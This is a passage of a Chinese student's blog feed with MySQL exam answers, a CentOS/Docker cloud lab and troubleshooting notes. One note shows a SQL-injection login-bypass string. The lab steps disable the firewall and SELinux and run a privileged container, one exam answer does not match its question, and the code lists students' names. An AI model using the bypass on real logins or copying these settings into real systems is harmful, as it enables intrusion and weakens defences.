class="code"><pre><code class="hljs mysql">delete from grade where itemid=(select itemid from item where itemname=&#x27;女子跳高&#x27;);delete from item where itemname=’女子跳高’;delete from grade where itemid=(select itemid from item where itemname=&#x27;女子跳高&#x27;);delete from item where itemname=’女子跳高’;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229164253835.png" class="" title="image-20211229164253835"><p>（11） 在game数据库中创建一个名为v_jf的视图，该视图显示成绩表grade中积分大于等于</p><p>4的运动员编号、项目编号、积分信息。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create view v_jf <br>as<br>select sporter.sporterid,sporter.name,grade.Mark from grade, sporter where sporter.sporterid=grade.id and grade.Mark &gt;=6;<br>desc v_jf;<br>select * from v_jf;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229170014923.png" class="" title="image-20211229170014923">]]></content>
    
    
    <categories>
      
      <category>MySQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cloud_exam</title>
    <link href="/2021/12/23/cloud-exam/"/>
    <url>/2021/12/23/cloud-exam/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>快期末了，不能摸鱼了，还是做点实操吧。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><img src="/2021/12/23/cloud-exam/image-20211223151158095.png" class=""><h3 id="0x01-yum仓库配置"><a href="#0x01-yum仓库配置" class="headerlink" title="0x01 yum仓库配置"></a>0x01 yum仓库配置</h3><h4 id="1-挂载本地镜像作为yum源"><a href="#1-挂载本地镜像作为yum源" class="headerlink" title="1.挂载本地镜像作为yum源"></a>1.挂载本地镜像作为yum源</h4><p>懒了，这里直接贴命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">使用root用户</span><br>su root<br><span class="hljs-meta">#</span><span class="bash">将镜像挂载至/opt/centos</span><br>mkdir -p /opt/centos &amp;&amp; mount /dev/cdrom /opt/centos<br><span class="hljs-meta">#</span><span class="bash">设置永久挂载(可选项)</span><br>cat &gt;&gt;/etc/fstab&lt;&lt;EOF<br>/dev/cdrom /opt/centos /opt/centos iso9660 defaults 0 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">进入yum源目录</span><br>cd /etc/yum.repos.d/<br><span class="hljs-meta">#</span><span class="bash">编辑local.repo文件</span><br>cat &gt;local.repo<br><br>[local]<br>name=local<br>baseurl=file:///opt/centos<br>enabled=1<br>gpgcheck=0<br></code></pre></td></tr></table></figure><p>设置好了本地yum源后，可能会出现获取不到本地yum源，这里的话们可以清除yum缓存等操作进行解决。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清除yum缓存</span><br>yum clean all <br><span class="hljs-meta">#</span><span class="bash">把Yum源缓存到本地，加快软件的搜索好安装速度</span><br>yum makecache <br><span class="hljs-meta">#</span><span class="bash">列出了yum包</span><br>yum list <br></code></pre></td></tr></table></figure><h4 id="2-配置ftp源"><a href="#2-配置ftp源" class="headerlink" title="2.配置ftp源"></a>2.配置ftp源</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">ftp.repo</span><br>[iaas]<br>name=iaas<br>baseurl=ftp://192.168.100.200/iaas<br>gpgcheck=0<br>enabled=1<br></code></pre></td></tr></table></figure><h4 id="3-配置网络源"><a href="#3-配置网络源" class="headerlink" title="3.配置网络源"></a>3.配置网络源</h4><p>虽然题目给点源有问题，但也得做作业!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">替换默认的源</span><br>sudo sed -e &#x27;s|^mirrorlist=|#mirrorlist=|g&#x27; \<br>         -e &#x27;s|^#baseurl=http://mirror.centos.org/centos|baseurl=https://mirrors.aliyun.com/repo/|g&#x27; \<br>         -i.bak \<br>         /etc/yum.repos.d/CentOS-Base.repo<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">local.repo</span><br>[local]<br>name=CentOS-$releasever - Base - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=https://mirrors.aliyun.com/repo/<br>gpgcheck=1<br>gpgkey=0<br></code></pre></td></tr></table></figure><p>再清除yum缓存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清除yum缓存</span><br>yum clean all <br><span class="hljs-meta">#</span><span class="bash">把Yum源缓存到本地，加快软件的搜索好安装速度</span><br>yum makecache <br><span class="hljs-meta">#</span><span class="bash">列出了yum包</span><br>yum list <br></code></pre></td></tr></table></figure><h3 id="0x02-使用LNMP架构部署商城网站"><a href="#0x02-使用LNMP架构部署商城网站" class="headerlink" title="0x02 使用LNMP架构部署商城网站"></a>0x02 使用LNMP架构部署商城网站</h3><p>这里和老师做的有些不同，当时为了方便（瞎折腾），便自己开始用docker搭建商城网站，当时想法挺不错的，但实施的过程中出现了很多问题，例如docker权限问题，hosts文件问题等等。这里便记录一下。</p><h4 id="1-使用docker-创建好centos7环境"><a href="#1-使用docker-创建好centos7环境" class="headerlink" title="1. 使用docker 创建好centos7环境"></a>1. 使用docker 创建好centos7环境</h4><p>(1)在远程仓库上拉取centos7镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull centos:7.2.1511<br></code></pre></td></tr></table></figure><p>(2)创建容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">docker --privileged=<span class="hljs-literal">true</span> 使用该参数，container内的root拥有真正的root权限。否则，container内的root只是外部的一个普通用户权限。</span><br>docker run -it -v C:\Users\23719\centos7:/root --privileged=true -p8999:80 --name centos7 centos:7.2.1511 /bin/bash<br></code></pre></td></tr></table></figure><p>创建好了容器之后,直接按照老师的文档做就行了。</p><p>如图所示：</p><img src="/2021/12/23/cloud-exam/image-20211223162142874.png" class=""><p>之前做了一个问题排除的文档，这里给大家发一下。</p><h4 id="2-问题排除"><a href="#2-问题排除" class="headerlink" title="2.问题排除"></a>2.问题排除</h4><p>1.用以下命令先关闭防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">以下的命令一行一行的输</span><br>iptables -F;iptables -X;iptables -Z;iptables-save<br>setenforce 0<br>systemctl stop firewalld<br></code></pre></td></tr></table></figure><p>2.修改主机名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hostnamectl set-hostname mall<br></code></pre></td></tr></table></figure><p>用以下命令查看主机名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hostname<br></code></pre></td></tr></table></figure><img src="/2021/12/23/cloud-exam/image-20211223162607886.png" class=""><p>若出现mall则代表修改成功</p><p>3.开启 zookeeper和 kafka服务</p><p>进入到 zookeeper-3.4.14/bin 目录下，启动 ZooKeeper 服务，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./zkServer.sh start<br></code></pre></td></tr></table></figure><p>进入到 kafka_2.11-1.1.1/bin 目录下，启动 Kafka 服务，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kafka-server-start.sh -daemon ../config/server.properties<br></code></pre></td></tr></table></figure><p>利用jps命令查看有没有开启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jps<br></code></pre></td></tr></table></figure><img src="/2021/12/23/cloud-exam/image-20211223162739295.png" class=""><p>若出现Kafka和QuorumPeerMain字样则证明开启成功。</p><p>4.修改hosts文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/hosts<br></code></pre></td></tr></table></figure><p>输入以下内容,要注意的是，这里的ip是本机地址的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">172.17.0.2 kafka.mall<br>172.17.0.2 mysql.mall<br>172.17.0.2 redis.mall<br>172.17.0.2 zookeeper.mall<br></code></pre></td></tr></table></figure><p>5.启动数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start mariadb<br></code></pre></td></tr></table></figure><p>6.启动redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start redis<br></code></pre></td></tr></table></figure><p>7.启动 Elasticsearch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start elasticsearch<br></code></pre></td></tr></table></figure><p>8.启动java软件包</p><p>进入gpmall-source文件夹下，运行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;<br>nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;<br>nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;<br>nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;<br></code></pre></td></tr></table></figure><p>9.重启nginx，并等待几分钟再打开浏览器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart nginx<br></code></pre></td></tr></table></figure><p>8.查看一下是否有8082端口开放</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -nptl<br></code></pre></td></tr></table></figure><img src="/2021/12/23/cloud-exam/image-20211223163042252.png" class=""><p>可以发现，并没有8082端口开放</p><p>继续重复8和9的步骤，就可以了。</p><img src="/2021/12/23/cloud-exam/image-20211223163112787.png" class=""><p>最终效果</p><img src="/2021/12/23/cloud-exam/image-20211223163127457.png" class=""><h3 id="0x03-docker-swarm集群配置"><a href="#0x03-docker-swarm集群配置" class="headerlink" title="0x03 docker swarm集群配置"></a>0x03 docker swarm集群配置</h3><p>按照老师给的文档做即可，建议两台虚拟机内存都在2G以上，如果配置过程中无法连接到WEB页面，可能是防火墙没有关。</p><p>这里只给出配置过程中相关的截图。</p><img src="/2021/12/23/cloud-exam/image-20211223163925423.png" class=""><p>parainer登录界面</p><img src="/2021/12/23/cloud-exam/image-20211223164253789.png" class=""><p> 完成时的截图 </p><p>master节点:</p><img src="/2021/12/23/cloud-exam/image-20211223164513232.png" class=""><p>node节点:</p><img src="/2021/12/23/cloud-exam/image-20211223164538279.png" class="">]]></content>
    
    
    <categories>
      
      <category>云计算</category>
      
    </categories>
    
    
    <tags>
      
      <tag>云计算</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>summary1</title>
    <link href="/2021/12/16/summary1/"/>
    <url>/2021/12/16/summary1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现自己有很多不足，于是乎写个文章来自我总结发现的一些问题。</p><h3 id="0x01-centos7下无法安装本地yum源软件包的一些问题的思考"><a href="#0x01-centos7下无法安装本地yum源软件包的一些问题的思考" class="headerlink" title="0x01 centos7下无法安装本地yum源软件包的一些问题的思考"></a>0x01 centos7下无法安装本地yum源软件包的一些问题的思考</h3><p>在做云计算作业的时候，出现一个疑惑，就是自己明明配置好了本地的yum源，发现无法从本地的yum源安装软件包以及一些依赖，而从本地的yum仓库中却能够找到相应的rpm包，</p><img src="/2021/12/16/summary1/image-20211216195052921.png" class=""><blockquote><p>从华为云官网的<a href="https://support.huaweicloud.com/prtg-dubbo-kunpengwebs/kunpengdubbo268_02_0004.html">相关文档</a>了解到，在配置了本地yum源后，为了保险起见，需要用以下命令使yum源生效，要不然的话，可能会出现加载不到yum仓库的安装包的情况：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清空yum已存在的源信息（缓存）</span><br>yum clean all<br><span class="hljs-meta">#</span><span class="bash">重新加载源信息</span><br>yum makecache<br><span class="hljs-meta">#</span><span class="bash">列出所有可安裝的软件清单</span><br>yum list<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/image-20211216201539002.png" class="" title="image-20211216201539002"><p>但查阅<a href="https://blog.csdn.net/weixin_46436935/article/details/109600481">相关文档</a>后发现，yum安装软件时会自动进行缓存,我猜测可能是网络源和本地源会有冲突。</p><h3 id="0x02-mysql数据库where条件自动类型问题带来的思考"><a href="#0x02-mysql数据库where条件自动类型问题带来的思考" class="headerlink" title="0x02 mysql数据库where条件自动类型问题带来的思考"></a>0x02 mysql数据库where条件自动类型问题带来的思考</h3><p>一个朋友问到的问题，执行了以下语句后并没有报错，而是把user字段的值全查出来了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;admin&#x27; --&#x27;&#x27;;<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/407796688db5159fc2e93f2d6d74420.png" class=""><p>mysql在使用where查询的时候，如果查询约束的字段是varchar类型，但是查询条件是int类型，则会把无法直接转成数字的值都强转映射成0。</p><p>而这也正是那些sql注入万能密码之一。</p><h3 id="0x03-离谱，被一个错误搞自闭了"><a href="#0x03-离谱，被一个错误搞自闭了" class="headerlink" title="0x03 离谱，被一个错误搞自闭了"></a>0x03 离谱，被一个错误搞自闭了</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh: 0: getcwd() failed: No such file or directory<br></code></pre></td></tr></table></figure><p>刚刚把某个目录给删除了，而命令还停在原来的目录上，因此出现了这种问题。</p><p>退回到上级还存在的目录即可。</p><img src="/2021/12/16/summary1/image-20220215212854737.png" class=""><img src="/2021/12/16/summary1/image-20220215212925214.png" class=""><h3 id="0x04-composer入坑记录"><a href="#0x04-composer入坑记录" class="headerlink" title="0x04 composer入坑记录"></a>0x04 composer入坑记录</h3><img src="/2021/12/16/summary1/image-20220216145816266.png" class=""><img src="/2021/12/16/summary1/image-20220216150616059.png" class=""><img src="/2021/12/16/summary1/image-20220216150757695.png" class=""><img src="/2021/12/16/summary1/image-20220216152248161.png" class="" title="image-20220216152248161"><h3 id="0x04-kali-文件尺寸不符，您使用的镜像正在同步中……"><a href="#0x04-kali-文件尺寸不符，您使用的镜像正在同步中……" class="headerlink" title="0x04 kali 文件尺寸不符，您使用的镜像正在同步中……"></a>0x04 kali 文件尺寸不符，您使用的镜像正在同步中……</h3><p>这种情况一般发生在apt clean后，删除了包缓存中的所有包，重新apt update后。发生这种错误的原因是第三方镜像源未来得及和官方镜像源进行同步，导致hash校验不通过。解决问题也很简单，换源，但我建议换成官方的镜像源(现在官方的镜像源也挺快的),查看<a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">官网文档</a>发现官方镜像源也分为<strong>kali-rolling</strong>(默认 &amp; 经常更新)和<strong>kali-last-snapshot</strong>(更“稳定”和“最安全)两个版本。</p><img src="/2021/12/16/summary1/image-20220406162452797.png" class="" title="image-20220406162452797"><h3 id="0x05-此平台不支持AMD-V-RVI"><a href="#0x05-此平台不支持AMD-V-RVI" class="headerlink" title="0x05 此平台不支持AMD-V/RVI"></a>0x05 此平台不支持AMD-V/RVI</h3><p>明明在win下已经开启了cpu的虚拟化，但还是会报错，这是由于在Windows下开了wsl2子系统，就必须依赖Hyper-V来驱动，虽然VMware 支持Hyper-V，但在底层还是会存在问题，不知道是不是AMD的自身虚拟化的原因,而且用过ENSP再细心点会发现，ENSP底层需要开启CPU的虚拟化，但如果操作系统直接或间接开启Hyper-V，将会导致ENSP的虚拟化失败，报40错误。解决方法主要为以下两种：</p><p>1.将wsl2降至wsl版本，并在启用或关闭Windows功能里取消勾选虚拟机平台。</p><p>2.使用一块硬盘制作WTG盘，下次直接通过硬盘启动。(不得不说，这方法确实有点麻烦)</p><img src="/2021/12/16/summary1/image-20220406164151923.png" class="" title="image-20220406164151923"><h3 id="0x06-docker-compose容器多服务通信问题"><a href="#0x06-docker-compose容器多服务通信问题" class="headerlink" title="0x06 docker-compose容器多服务通信问题"></a>0x06 docker-compose容器多服务通信问题</h3><h4 id="在同一个服务内，如何实现用php-apache容器连接mysql容器的服务"><a href="#在同一个服务内，如何实现用php-apache容器连接mysql容器的服务" class="headerlink" title="在同一个服务内，如何实现用php-apache容器连接mysql容器的服务?"></a>在同一个服务内，如何实现用php-apache容器连接mysql容器的服务?</h4><p>问题解决，如果php-apache和mysql在一个服务中，那么可以通过在php-apache连接mysql时服务器名填mysql(mysql服务名)，也就是说mysqli的mysql.default_host默认为容器名。</p><img src="/2021/12/16/summary1/image-20220406173235022.png" class="" title="image-20220406173235022"><p>而在配置docker-compose.yml文件时，在docker-compose 3.1下，在同services服务下两个容器默认是已经link了，或者在php-apache加个links: -mysql(但这种方法将会被弃用)</p><h3 id="0x07-浏览器无法打开外部应用"><a href="#0x07-浏览器无法打开外部应用" class="headerlink" title="0x07 浏览器无法打开外部应用"></a>0x07 浏览器无法打开外部应用</h3><p>在做eve实验时，在用浏览器页面中用telnet登录交换机时，网页浏览器不进行任何跳转，无法打开外部应用。产生这种情况的话，可能是因为浏览器不知道telnet是个协议，而在默认情况下是知道的，不知道电脑出了什么毛病，识别不出来，那么我们只能用浏览器自定义协议。</p><p>在通过浏览器调用外部程序时，浏览器会在我们本地的注册表中查找协议所对应的注册表，并获取实际要调用的程序路径进行调用。</p><p>那么我们可以手动<a href="https://www.icode9.com/content-4-1007094.html">注册表解析</a>，新建一个telnet.reg文件，输入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Windows</span> <span class="hljs-string">Registry</span> <span class="hljs-string">Editor</span> <span class="hljs-string">Version</span> <span class="hljs-number">5.00</span><br><br>[<span class="hljs-string">HKEY_CLASSES_ROOT\telnet</span>]<br><span class="hljs-string">@=&quot;Tlenet</span> <span class="hljs-string">Plugin&quot;</span><br><span class="hljs-string">&quot;URL Protocol&quot;</span><span class="hljs-string">=&quot;C:\\Program</span> <span class="hljs-string">Files\\PuTTY\\putty.exe&quot;</span><br><br>[<span class="hljs-string">HKEY_CLASSES_ROOT\telnet\shell</span>]<br><br>[<span class="hljs-string">HKEY_CLASSES_ROOT\telnet\shell\open</span>]<br><br>[<span class="hljs-string">HKEY_CLASSES_ROOT\telnet\shell\open\command</span>]<br><span class="hljs-string">@=&quot;C:\\Program</span> <span class="hljs-string">Files\\PuTTY\\putty.exe</span> <span class="hljs-string">%1&quot;</span><br></code></pre></td></tr></table></figure><p>双击后就大功告成了，但对注册表操作是相当危险的，不建议操作。</p><img src="/2021/12/16/summary1/image-20220408194108032.png" class="" title="image-20220408194108032"><h3 id="0x08-在使用-python3-xlsxwriter库时引发的问题"><a href="#0x08-在使用-python3-xlsxwriter库时引发的问题" class="headerlink" title="0x08 在使用 python3 xlsxwriter库时引发的问题"></a>0x08 在使用 python3 xlsxwriter库时引发的问题</h3><p>在做python作业时，遇到同时使用两个迭代器时，会默认只存储最后一个值（好像是这样的）。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> xlsxwriter<br><br>dict_stu=&#123;<span class="hljs-number">1</span>:<span class="hljs-string">&#x27;程小青&#x27;</span>,<span class="hljs-number">3</span>:<span class="hljs-string">&#x27;石雯雯&#x27;</span>,<span class="hljs-number">4</span>:<span class="hljs-string">&#x27;苏彤&#x27;</span>,<span class="hljs-number">5</span>:<span class="hljs-string">&#x27;王欣雨&#x27;</span>,<span class="hljs-number">6</span>:<span class="hljs-string">&#x27;薄智鑫&#x27;</span>,<span class="hljs-number">7</span>:<span class="hljs-string">&#x27;陈华超&#x27;</span>,<span class="hljs-number">8</span>:<span class="hljs-string">&#x27;葛超驰&#x27;</span>,<span class="hljs-number">9</span>:<span class="hljs-string">&#x27;韩硕&#x27;</span>,<span class="hljs-number">11</span>:<span class="hljs-string">&#x27;黄昊&#x27;</span>,<span class="hljs-number">12</span>:<span class="hljs-string">&#x27;焦俊&#x27;</span>,<span class="hljs-number">13</span>:<span class="hljs-string">&#x27;黎子豪&#x27;</span>,<span class="hljs-number">14</span>:<span class="hljs-string">&#x27;李博文&#x27;</span>,<span class="hljs-number">15</span>:<span class="hljs-string">&#x27;李荣伟&#x27;</span>,<span class="hljs-number">16</span>:<span class="hljs-string">&#x27;李帅奇&#x27;</span>,<span class="hljs-number">18</span>:<span class="hljs-string">&#x27;李炜&#x27;</span>,<span class="hljs-number">19</span>:<span class="hljs-string">&#x27;李月仓&#x27;</span>,<span class="hljs-number">20</span>:<span class="hljs-string">&#x27;刘高伟&#x27;</span>,<span class="hljs-number">21</span>:<span class="hljs-string">&#x27;路迪飞&#x27;</span>,<span class="hljs-number">22</span>:<span class="hljs-string">&#x27;宋禹宏&#x27;</span>,<span class="hljs-number">24</span>:<span class="hljs-string">&#x27;田朕宇&#x27;</span>,<span class="hljs-number">25</span>:<span class="hljs-string">&#x27;王禹皓&#x27;</span>,<span class="hljs-number">26</span>:<span class="hljs-string">&#x27;吴琪琛&#x27;</span>,<span class="hljs-number">27</span>:<span class="hljs-string">&#x27;吴永帅&#x27;</span>,<span class="hljs-number">28</span>:<span class="hljs-string">&#x27;颜亨太&#x27;</span>,<span class="hljs-number">30</span>:<span class="hljs-string">&#x27;张珈玮&#x27;</span>,<span class="hljs-number">31</span>:<span class="hljs-string">&#x27;张家朋&#x27;</span>,<span class="hljs-number">34</span>:<span class="hljs-string">&#x27;张子傲&#x27;</span>,<span class="hljs-number">35</span>:<span class="hljs-string">&#x27;赵瑞&#x27;</span>,<span class="hljs-number">36</span>:<span class="hljs-string">&#x27;赵永旺&#x27;</span>,<span class="hljs-number">37</span>:<span class="hljs-string">&#x27;赵振&#x27;</span>,<span class="hljs-number">38</span>:<span class="hljs-string">&#x27;朱苏宁&#x27;</span>,<span class="hljs-number">39</span>:<span class="hljs-string">&#x27;朱唐喜&#x27;</span>,<span class="hljs-number">40</span>:<span class="hljs-string">&#x27;庄廷泽&#x27;</span>,<span class="hljs-number">41</span>:<span class="hljs-string">&#x27;邹超磊&#x27;</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_excel</span>():</span><br>    workbook = xlsxwriter.Workbook(<span class="hljs-string">&#x27;student_442.xlsx&#x27;</span>)<br>    worksheet = workbook.add_worksheet(<span class="hljs-string">u&#x27;student&#x27;</span>)<br>    worksheet.write(<span class="hljs-string">&#x27;A1&#x27;</span>, <span class="hljs-string">&#x27;学号&#x27;</span>)<br>    worksheet.write(<span class="hljs-string">&#x27;B1&#x27;</span>, <span class="hljs-string">&#x27;姓名&#x27;</span>)<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dict_stu)):<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> dict_stu.items():<br>            worksheet.write(i + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, key)<br>            worksheet.write(i+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,value)<br><br>    workbook.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    write_excel();<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;写入成功&#x27;</span>)<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/16/summary1/image-20220410132027292.png" class="" title="image-20220410132027292"><p>当改成这样子时，也就是说改成使用一个迭代器时，就不会发生这样的问题。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> xlsxwriter<br><br>dict_stu=&#123;<span class="hljs-number">1</span>:<span class="hljs-string">&#x27;程小青&#x27;</span>,<span class="hljs-number">3</span>:<span class="hljs-string">&#x27;石雯雯&#x27;</span>,<span class="hljs-number">4</span>:<span class="hljs-string">&#x27;苏彤&#x27;</span>,<span class="hljs-number">5</span>:<span class="hljs-string">&#x27;王欣雨&#x27;</span>,<span class="hljs-number">6</span>:<span class="hljs-string">&#x27;薄智鑫&#x27;</span>,<span class="hljs-number">7</span>:<span class="hljs-string">&#x27;陈华超&#x27;</span>,<span class="hljs-number">8</span>:<span class="hljs-string">&#x27;葛超驰&#x27;</span>,<span class="hljs-number">9</span>:<span class="hljs-string">&#x27;韩硕&#x27;</span>,<span class="hljs-number">11</span>:<span class="hljs-string">&#x27;黄昊&#x27;</span>,<span class="hljs-number">12</span>:<span class="hljs-string">&#x27;焦俊&#x27;</span>,<span class="hljs-number">13</span>:<span class="hljs-string">&#x27;黎子豪&#x27;</span>,<span class="hljs-number">14</span>:<span class="hljs-string">&#x27;李博文&#x27;</span>,<span class="hljs-number">15</span>:<span class="hljs-string">&#x27;李荣伟&#x27;</span>,<span class="hljs-number">16</span>:<span class="hljs-string">&#x27;李帅奇&#x27;</span>,<span class="hljs-number">18</span>:<span class="hljs-string">&#x27;李炜&#x27;</span>,<span class="hljs-number">19</span>:<span class="hljs-string">&#x27;李月仓&#x27;</span>,<span class="hljs-number">20</span>:<span class="hljs-string">&#x27;刘高伟&#x27;</span>,<span class="hljs-number">21</span>:<span class="hljs-string">&#x27;路迪飞&#x27;</span>,<span class="hljs-number">22</span>:<span class="hljs-string">&#x27;宋禹宏&#x27;</span>,<span class="hljs-number">24</span>:<span class="hljs-string">&#x27;田朕宇&#x27;</span>,<span class="hljs-number">25</span>:<span class="hljs-string">&#x27;王禹皓&#x27;</span>,<span class="hljs-number">26</span>:<span class="hljs-string">&#x27;吴琪琛&#x27;</span>,<span class="hljs-number">27</span>:<span 